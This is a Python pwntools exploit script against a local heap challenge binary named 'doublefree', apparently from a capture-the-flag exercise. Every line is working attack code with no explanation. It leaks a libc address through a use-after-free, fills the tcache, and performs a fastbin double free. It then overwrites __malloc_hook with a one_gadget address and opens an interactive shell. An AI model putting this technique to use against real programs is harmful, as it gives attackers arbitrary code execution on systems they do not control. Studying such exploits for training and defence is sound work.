#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./doublefree')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(x):
    r.recvuntil("Your choice :")
    r.sendline(str(x))

def alloc(i,l,s):
    cmd(1)
    r.recvuntil('Index :')
    r.sendline(str(i))
    r.recvuntil('Size :')
    r.sendline(str(int(l)))
    r.recvuntil('Data :')
    r.sendline(s)

def delete(i):
    cmd(2)
    r.recvuntil('Index :')
    r.sendline(str(i))

def show(i):
    cmd(3)
    r.recvuntil('Index :')
    r.sendline(str(i))

alloc(0, 0x500, 'a')
alloc(1, 0x500, 'a')

delete(0)
show(0) # UAF

leak = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
libc_base = leak - 0x3ebca0
print '[+] libc_base :',hex(libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print '[+] malloc_hook :',hex(malloc_hook)
one_gadget = libc_base + 0x10a38c
print '[+] one_gadget :',hex(one_gadget)

for i in range(7):
    alloc(i, 0x68, str(i))

alloc(8, 0x68, 'a')
alloc(9, 0x68, 'a')

for i in range(7):
    delete(i)

delete(8) # Double Free
delete(9)
delete(8)

for i in range(7):
    alloc(i, 0x68, str(i))

alloc(8, 0x68, p64(malloc_hook - 0x2b))
alloc(0, 0x68, 'a')
alloc(0, 0x68, 'a')
alloc(0, 0x68, 'a'*0x2b + p64(one_gadget))

r.interactive()
